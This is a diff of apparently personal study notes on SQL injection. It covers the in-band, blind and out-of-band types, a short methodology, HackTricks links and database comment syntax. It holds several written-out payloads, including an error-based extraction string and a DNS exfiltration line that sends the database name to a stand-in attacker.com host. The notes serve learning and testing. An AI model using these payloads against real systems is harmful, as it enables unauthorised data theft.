@@ -1,5 +1,5 @@
 # SQL Injection
-The goal is to inject SQL into web apps that utlimately change the final SQL query sent by the web app to it's database - resulting in performing your own SQL queries directly against the database.
+An SQL injection is a security flaw that allows attackers to interfere with database queries of an application. 
 
 There are two types of databases, relational and non-relational -
 - Relational Databases (SQL):
@@ -16,7 +16,7 @@ There are two types of databases, relational and non-relational -
     - Examples: MongoDB, Redis, Cassandra
 
 ## 3 types of SQLi
-### 1. In-band
+### In-band
 Where the attacker receives results directly in the same communication channel they used to send the attack. First choice when application shows database errors or results.
 - Union based
     - How it works: Uses the UNION operator to combine results from the original query with results from a malicious query
@@ -30,7 +30,7 @@ Where the attacker receives results directly in the same communication channel t
     - Example: `' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -`
     - Limitation: Only small amounts of data per error
 
-### 2. Blind
+### Blind
 Where no direct output is returned, so attackers infer information based on application behavior.
 - Boolean (When application responds differently to true/false conditions)
     - How it works: Sends queries that return True/False responses based on application behavior
@@ -44,33 +44,34 @@ Where no direct output is returned, so attackers infer information based on appl
     - Logic: If condition is true, page takes 5+ seconds to load
     - Characteristics: Very slow, but works when no other feedback exists
       
-### 3. Out-of-band 
+### Out-of-band (Hard mode)
 Where it uses different communication channels to receive results (separate from the attack channel). Used w2hen all other methods fail, or for stealth/speed in advanced scenarios.
-- How it works:
-    - Triggers database to make external connections (HTTP, DNS, SMB)
-    - Data is sent to attacker-controlled external server
-    - Useful when in-band methods don't work due to firewalls/filtering
+- How it works: Triggers database to make external connections (HTTP, DNS, SMB) --> Data is sent to attacker-controlled external server --> Useful when in-band methods don't work due to firewalls/filtering
 - Common techniques:
-    - DNS exfiltration: `' AND (SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\share')))-- -`
+    - DNS exfiltration: `' AND (SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\share')))-- -`.
     - HTTP requests: Database makes HTTP calls to attacker's server with data in URL
     - Email: Some databases can send emails with extracted data
-- Requirements:
-    - Database must have network access
-    - Specific database functions enabled (like xp_cmdshell in SQL Server)
-    - Attacker needs external infrastructure to receive data
-- Characteristics:
-    - Most complex to set up
-    - Often fastest for large data extraction
-    - Bypasses many filtering mechanisms
-    - Requires advanced database privileges
+- Requirements: Database must have network access / Specific database functions enabled (like xp_cmdshell in SQL Server) / Attacker needs external infrastructure to receive data
+- Characteristics: Most complex to set up / Often fastest for large data extraction / Bypasses many filtering mechanisms / Requires advanced database privileges
 
 # Resources
+- [3306 - Pentesting Mysql](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html)
+- [1433 - Pentesting MSSQL - Microsft SQL Server](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html)
+- [5432,5433 - Pentesting Postgresql](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html)
+- [9001 - Pentesting HSQLDB](https://book.hacktricks.wiki/en/network-services-pentesting/9001-pentesting-hsqldb.html)
+- [NoSQL injection](https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html)
+- [RSQL Injection](https://book.hacktricks.wiki/en/pentesting-web/rsql-injection.html)
+- 
 
 # Good Examples
 
 # Tooling
 
 # Methodology TLDR
+[HackTricks](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html#entry-point-detection)
+1. Find an entry point and figure out how to escape it's context
+2. Make it so that it doesn't error out when you've escaped by adding something a comment tag or `'`. Your goal is to either get the previous query to accept NEW data or just input your data and then a comment symbol to the end.
+
 
 # Useful Commands + Syntax
 | **Description** | **Command** |
@@ -158,6 +159,32 @@ $result = $conn->query($query);
 * NOT (`!`)
 * AND (`&&`)
 * OR (`||`)
+
+## MySQL Comments
+```sql
+#comment
+-- comment     [Note the space after the double dash]
+/*comment*/
+/*! MYSQL Special SQL */
+
+PostgreSQL
+--comment
+/*comment*/
+
+MSQL
+--comment
+/*comment*/
+
+Oracle
+--comment
+
+SQLite
+--comment
+/*comment*/
+
+HQL
+HQL does not support comments
+```
 
 ## SQL Injection
 | **Description** | **Payload** |
